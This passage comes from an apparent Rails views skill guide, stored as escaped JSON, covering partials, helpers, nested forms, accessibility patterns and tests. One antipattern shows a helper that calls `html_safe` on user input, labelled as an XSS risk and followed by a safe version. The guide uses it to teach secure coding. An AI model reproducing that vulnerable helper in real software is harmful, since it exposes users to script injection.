\"feedback\", locals: { feedback: @feedback, show_actions: true } %>\n\n<%# Partial definition: app/views/feedbacks/_feedback.html.erb %>\n<div id=\"<%= dom_id(feedback) %>\" class=\"card\">\n  <h3><%= feedback.content %></h3>\n  <% if local_assigns[:show_actions] %>\n    <%= link_to \"Edit\", edit_feedback_path(feedback) %>\n  <% end %>\n</div>\n```\n\n**Why local_assigns?** Prevents `NameError` when variable not passed. Allows optional parameters with defaults.\n</pattern>\n\n<pattern name=\"collection-rendering\">\n<description>Efficiently render partials for collections</description>\n\n```erb\n<%# Shorthand - automatic partial lookup %>\n<%= render @feedbacks %>\n\n<%# Explicit collection with counter %>\n<%= render partial: \"feedback\", collection: @feedbacks %>\n\n<%# Partial with counters %>\n<%# app/views/feedbacks/_feedback.html.erb %>\n<div id=\"<%= dom_id(feedback) %>\" class=\"card\">\n  <span class=\"badge\"><%= feedback_counter + 1 %></span>\n  <h3><%= feedback.content %></h3>\n  <% if feedback_iteration.first? %>\n    <span class=\"label\">First</span>\n  <% end %>\n</div>\n```\n\n**Counter variables:** `feedback_counter` (0-indexed), `feedback_iteration` (methods: `first?`, `last?`, `index`, `size`)\n</pattern>\n\n### Layouts & Content Blocks\n\n<pattern name=\"content-for\">\n<description>Customize layout sections from individual views</description>\n\n```erb\n<%# app/views/layouts/application.html.erb %>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <title><%= content_for?(:title) ? yield(:title) : \"App Name\" %></title>\n  <%= csrf_meta_tags %>\n  <%= stylesheet_link_tag \"application\" %>\n  <%= yield :head %>\n</head>\n<body>\n  <%= render \"shared/header\" %>\n  <main id=\"main-content\">\n    <%= render \"shared/flash_messages\" %>\n    <%= yield %>\n  </main>\n  <%= yield :scripts %>\n</body>\n</html>\n\n<%# app/views/feedbacks/show.html.erb %>\n<% content_for :title, \"#{@feedback.content.truncate(60)} | App\" %>\n<% content_for :head do %>\n  <meta name=\"description\" content=\"<%= @feedback.content.truncate(160) %>\">\n<% end %>\n<div class=\"feedback-detail\"><%= @feedback.content %></div>\n```\n\n</pattern>\n\n<antipattern>\n<description>Using instance variables in partials</description>\n<reason>Creates implicit dependencies, makes partials hard to reuse and test</reason>\n<bad-example>\n\n```erb\n<%# ❌ BAD - Coupled to controller %>\n<div class=\"feedback\"><%= @feedback.content %></div>\n```\n\n</bad-example>\n<good-example>\n\n```erb\n<%# ✅ GOOD - Explicit dependencies %>\n<div class=\"feedback\"><%= feedback.content %></div>\n<%= render \"feedback\", feedback: @feedback %>\n```\n\n</good-example>\n</antipattern>\n\n---\n\n## View Helpers\n\nView helpers are Ruby modules providing reusable methods for generating HTML, formatting data, and encapsulating view logic.\n\n### Custom Helpers\n\n<pattern name=\"status-badge-helper\">\n<description>Display status badges with consistent styling</description>\n\n```ruby\n# app/helpers/application_helper.rb\nmodule ApplicationHelper\n  def status_badge(status)\n    variants = { \"pending\" => \"warning\", \"reviewed\" => \"info\",\n                 \"responded\" => \"success\", \"archived\" => \"neutral\" }\n    variant = variants[status] || \"neutral\"\n    content_tag :span, status.titleize, class: \"badge badge-#{variant}\"\n  end\n\n  def page_title(title = nil)\n    base = \"The Feedback Agent\"\n    title.present? ? \"#{title} | #{base}\" : base\n  end\nend\n```\n\n```erb\n<%# Usage %>\n<%= status_badge(@feedback.status) %>\n<title><%= page_title(yield(:title)) %></title>\n```\n\n</pattern>\n\n<pattern name=\"text-helpers\">\n<description>Use built-in Rails text helpers for formatting</description>\n\n```erb\n<%= truncate(@feedback.content, length: 150) %>\n<%= time_ago_in_words(@feedback.created_at) %> ago\n<%= pluralize(@feedbacks.count, \"feedback\") %>\n<%= sanitize(user_content, tags: %w[p br strong em]) %>\n```\n\n</pattern>\n\n<antipattern>\n<description>Using html_safe on user input</description>\n<reason>XSS vulnerability - allows script execution</reason>\n<bad-example>\n\n```ruby\n# ❌ DANGEROUS\ndef render_content(content)\n  content.html_safe  # XSS risk!\nend\n```\n\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ SAFE - Auto-escaped or sanitized\ndef render_content(content)\n  content  # Auto-escaped by Rails\nend\n\ndef render_html(content)\n  sanitize(content, tags: %w[p br strong])\nend\n```\n\n</good-example>\n</antipattern>\n\n---\n\n## Nested Forms\n\nBuild forms that handle parent-child relationships with `accepts_nested_attributes_for` and `fields_for`.\n\n### Basic Nested Forms\n\n<pattern name=\"has-many-nested-form\">\n<description>Form with has_many relationship using fields_for</description>\n\n**Model:**\n\n```ruby\n# app/models/feedback.rb\nclass Feedback < ApplicationRecord\n  has_many :attachments, dependent: :destroy\n  accepts_nested_attributes_for :attachments,\n    allow_destroy: true,\n    reject_if: :all_blank\n\n  validates :content, presence: true\nend\n```\n\n**Controller:**\n\n```ruby\nclass FeedbacksController < ApplicationController\n  def new\n    @feedback = Feedback.new\n    3.times { @feedback.attachments.build }  # Build empty attachments\n  end\n\n  private\n\n  def feedback_params\n    params.expect(feedback: [\n      :content,\n      attachments_attributes: [\n        :id,        # Required for updating existing records\n        :file,\n        :caption,\n        :_destroy   # Required for marking records for deletion\n      ]\n    ])\n  end\nend\n```\n\n**View:**\n\n```erb\n<%= form_with model: @feedback do |form| %>\n  <%= form.text_area :content, class: \"textarea\" %>\n\n  <div class=\"space-y-4\">\n    <h3>Attachments</h3>\n    <%= form.fields_for :attachments do |f| %>\n      <div class=\"nested-fields card\">\n        <%= f.file_field :file, class: \"file-input\" %>\n        <%= f.text_field :caption, class: \"input\" %>\n        <%= f.hidden_field :id if f.object.persisted? %>\n        <%= f.check_box :_destroy %> <%= f.label :_destroy, \"Remove\" %>\n      </div>\n    <% end %>\n  </div>\n\n  <%= form.submit class: \"btn btn-primary\" %>\n<% end %>\n```\n\n</pattern>\n\n<antipattern>\n<description>Missing :id in strong parameters for updates</description>\n<reason>Rails can't identify which existing records to update, creates duplicates instead</reason>\n<bad-example>\n\n```ruby\n# ❌ BAD - Missing :id\ndef feedback_params\n  params.expect(feedback: [\n    :content,\n    attachments_attributes: [:file, :caption]  # Missing :id!\n  ])\nend\n```\n\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - Include :id for existing records\ndef feedback_params\n  params.expect(feedback: [\n    :content,\n    attachments_attributes: [:id, :file, :caption, :_destroy]\n  ])\nend\n```\n\n</good-example>\n</antipattern>\n\n---\n\n## Accessibility (WCAG 2.1 AA)\n\nEnsure your Rails application is usable by everyone, including people with disabilities. Accessibility is threaded through ALL view patterns.\n\n### Semantic HTML & ARIA\n\n<pattern name=\"semantic-structure\">\n<description>Use semantic HTML5 elements with proper ARIA labels</description>\n\n```erb\n<%# Semantic landmarks with skip link %>\n<a href=\"#main-content\" class=\"sr-only focus:not-sr-only\">\n  Skip to main content\n</a>\n\n<header>\n  <h1>Feedback Application</h1>\n  <nav aria-label=\"Main navigation\">\n    <ul>\n      <li><%= link_to \"Home\", root_path %></li>\n      <li><%= link_to \"Feedbacks\", feedbacks_path %></li>\n    </ul>\n  </nav>\n</header>\n\n<main id=\"main-content\">\n  <h2>Recent Feedback</h2>\n  <section aria-labelledby=\"pending-heading\">\n    <h3 id=\"pending-heading\">Pending Items</h3>\n  </section>\n</main>\n```\n\n**Why:** Screen readers use landmarks (header, nav, main, footer) and headings to navigate. Logical h1-h6 hierarchy (don't skip levels).\n</pattern>\n\n<pattern name=\"aria-labels\">\n<description>Provide accessible names for elements without visible text</description>\n\n```erb\n<%# Icon-only button %>\n<button aria-label=\"Close modal\" class=\"btn btn-ghost btn-sm\">\n  <svg class=\"w-4 h-4\">...</svg>\n</button>\n\n<%# Delete button with context %>\n<%= button_to \"Delete\", feedback_path(@feedback),\n              method: :delete,\n              aria: { label: \"Delete feedback from #{@feedback.sender_name}\" },\n              class: \"btn btn-error btn-sm\" %>\n\n<%# Modal with labelledby %>\n<dialog aria-labelledby=\"modal-title\" aria-modal=\"true\">\n  <h3 id=\"modal-title\">Feedback Details</h3>\n</dialog>\n\n<%# Form field with hint %>\n<%= form.text_field :email, aria: { describedby: \"email-hint\" } %>\n<span id=\"email-hint\">We'll never share your email</span>\n```\n\n</pattern>\n\n<pattern name=\"aria-live-regions\">\n<description>Announce dynamic content changes to screen readers</description>\n\n```erb\n<%# Flash messages with live region %>\n<div aria-live=\"polite\" aria-atomic=\"true\">\n  <% if flash[:notice] %>\n    <div role=\"status\" class=\"alert alert-success\">\n      <%= flash[:notice] %>\n    </div>\n  <% end %>\n  <% if flash[:alert] %>\n    <div role=\"alert\" class=\"alert alert-error\">\n      <%= flash[:alert] %>\n    </div>\n  <% end %>\n</div>\n\n<%# Loading state %>\n<div role=\"status\" aria-live=\"polite\" class=\"sr-only\" data-loading-target=\"status\">\n  <%# Updated via JS: \"Submitting feedback, please wait...\" %>\n</div>\n```\n\n**Values:** `aria-live=\"polite\"` (announces when idle), `aria-live=\"assertive\"` (interrupts), `aria-atomic=\"true\"` (reads entire region).\n</pattern>\n\n### Keyboard Navigation & Focus Management\n\n<pattern name=\"keyboard-accessibility\">\n<description>Ensure all interactive elements are keyboard accessible</description>\n\n```erb\n<%# Native elements - keyboard works by default %>\n<button type=\"button\" data-action=\"click->modal#open\">Open Modal</button>\n<%= button_to \"Delete\", feedback_path(@feedback), method: :delete %>\n\n<%# Custom interactive element needs full keyboard support %>\n<div tabindex=\"0\" role=\"button\"\n     data-action=\"click->controller#action keydown.enter->controller#action keydown.space->controller#action\">\n  Custom Button\n</div>\n```\n\n```css\n/* Always provide visible focus indicators */\nbutton:focus, a:focus, input:focus {\n  outline: 2px solid #3b82f6;\n  outline-offset: 2px;\n}\n```\n\n**Key Events:** Enter and Space activate buttons. Tab navigates. Escape closes modals.\n</pattern>\n\n### Accessible Forms\n\n<pattern name=\"form-labels-errors\">\n<description>Associate labels with inputs and display errors accessibly</description>\n\n```erb\n<%= form_with model: @feedback do |form| %>\n  <%# Error summary %>\n  <% if @feedback.errors.any? %>\n    <div role=\"alert\" id=\"error-summary\" tabindex=\"-1\">\n      <h2><%= pluralize(@feedback.errors.count, \"error\") %> prohibited saving:</h2>\n      <ul>\n        <% @feedback.errors.full_messages.each do |msg| %>\n          <li><%= msg %></li>\n        <% end %>\n      </ul>\n    </div>\n  <% end %>\n\n  <div class=\"form-control\">\n    <%= form.label :content, \"Your Feedback\" %>\n    <%= form.text_area :content,\n                       required: true,\n                       aria: {\n                         required: \"true\",\n                         describedby: \"content-hint\",\n                         invalid: @feedback.errors[:content].any? ? \"true\" : nil\n                       } %>\n    <span id=\"content-hint\">Minimum 10 characters required</span>\n    <% if @feedback.errors[:content].any? %>\n      <span id=\"content-error\" role=\"alert\">\n        <%= @feedback.errors[:content].first %>\n      </span>\n    <% end %>\n  </div>\n\n  <fieldset>\n    <legend>Sender Information</legend>\n    <%= form.label :sender_name, \"Name\" %>\n    <%= form.text_field :sender_name %>\n    <%= form.label :sender_email do %>\n      Email <abbr title=\"required\" aria-label=\"required\">*</abbr>\n    <% end %>\n    <%= form.email_field :sender_email, required: true, autocomplete: \"email\" %>\n  </fieldset>\n\n  <%= form.submit \"Submit\", data: { disable_with: \"Submitting...\" } %>\n<% end %>\n```\n\n**Why:** Labels provide accessible names. `role=\"alert\"` announces errors. `aria-invalid` marks problematic fields.\n</pattern>\n\n### Color Contrast & Images\n\n<pattern name=\"color-contrast\">\n<description>Ensure sufficient color contrast and accessible images</description>\n\n**WCAG AA Requirements:**\n- Normal text (< 18px): 4.5:1 ratio minimum\n- Large text (≥ 18px or bold ≥ 14px): 3:1 ratio minimum\n\n```erb\n<%# ✅ GOOD - High contrast + icon + text (not color alone) %>\n<span class=\"text-error\">\n  <svg aria-hidden=\"true\">...</svg>\n  <strong>Error:</strong> This field is required\n</span>\n\n<%# Images - descriptive alt text %>\n<%= image_tag \"chart.png\", alt: \"Bar chart: 85% positive feedback in March 2025\" %>\n\n<%# Decorative images - empty alt %>\n<%= image_tag \"decoration.svg\", alt: \"\", role: \"presentation\" %>\n\n<%# Functional images - describe action %>\n<%= link_to feedback_path(@feedback) do %>\n  <%= image_tag \"view-icon.svg\", alt: \"View feedback details\" %>\n<% end %>\n```\n\n</pattern>\n\n<antipattern>\n<description>Using placeholder as label</description>\n<reason>Placeholders disappear when typing and have insufficient contrast</reason>\n<bad-example>\n\n```erb\n<%# ❌ No label %>\n<input type=\"email\" placeholder=\"Enter your email\">\n```\n\n</bad-example>\n<good-example>\n\n```erb\n<%# ✅ Label + placeholder %>\n<label for=\"email\">Email Address</label>\n<input type=\"email\" id=\"email\" placeholder=\"you@example.com\">\n```\n\n</good-example>\n</antipattern>\n\n---\n\n<testing>\n**System Tests with Accessibility:**\n\n```ruby\n# test/system/accessibility_test.rb\nclass AccessibilityTest < ApplicationSystemTestCase\n  test \"form has accessible labels and ARIA\" do\n    visit new_feedback_path\n    assert_selector \"label[for='feedback_content']\"\n    assert_selector \"textarea#feedback_content[required][aria-required='true']\"\n  end\n\n  test \"errors are announced with role=alert\" do\n    visit new_feedback_path\n    click_button \"Submit\"\n    assert_selector \"[role='alert']\"\n    assert_selector \"[aria-invalid='true']\"\n  end\n\n  test \"keyboard navigation works\" do\n    visit feedbacks_path\n    page.send_keys(:tab)  # Should focus first interactive element\n    page.send_keys(:enter)  # Should activate element\n  end\nend\n\n# test/views/feedbacks/_feedback_test.rb\nclass Feedbacks::FeedbackPartialTest < ActionView::TestCase\n  test \"renders feedback content\" do\n    feedback = feedbacks(:one)\n    render partial: \"feedbacks/feedback\", locals: { feedback: feedback }\n    assert_select \"div.card\"\n    assert_select \"h3\", text: feedback.content\n  end\nend\n\n# test/helpers/application_helper_test.rb\nclass ApplicationHelperTest < ActionView::TestCase\n  test \"status_badge returns correct badge\" do\n    assert_includes status_badge(\"pending\"), \"badge-warning\"\n    assert_includes status_badge(\"responded\"), \"badge-success\"\n  end\nend\n```\n\n**Manual Testing Checklist:**\n- Test with keyboard only (Tab, Enter, Space, Escape)\n- Test with screen reader (NVDA, JAWS, VoiceOver)\n- Test browser zoom (200%, 400%)\n- Run axe DevTools or Lighthouse accessibility audit\n- Validate HTML (W3C validator)\n</testing>\n\n---\n\n<related-skills>\n- rails-ai:hotwire - Add interactivity with Turbo and Stimulus\n- rails-ai:styling - Style views with Tailwind and DaisyUI\n- rails-ai:controllers - RESTful actions and strong parameters for form handling\n- rails-ai:testing - View and system testing patterns\n</related-skills>\n\n<resources>\n\n**Official Documentation:**\n- [Rails Guides - Layouts and Rendering](https://guides.rubyonrails.org/layouts_and_rendering.html)\n- [Rails Guides - Action View Helpers](https://guides.rubyonrails.org/action_view_helpers.html)\n- [Rails Guides - Rails Accessibility](https://guides.rubyonrails.org/accessibility.html)\n\n**Accessibility Standards:**\n- [WCAG 2.1 Quick Reference](https://www.w3.org/WAI/WCAG21/quickref/)\n- [WebAIM WCAG 2 Checklist](https://webaim.org/standards/wcag/checklist)\n- [WAI-ARIA Authoring Practices Guide](https://www.w3.org/WAI/ARIA/apg/)\n\n**Tools:**\n- [axe DevTools](https://www.deque.com/axe/devtools/) - Accessibility testing browser extension\n\n</resources>"
              }
            ]
          }
        ]
      }
    }
  ]
}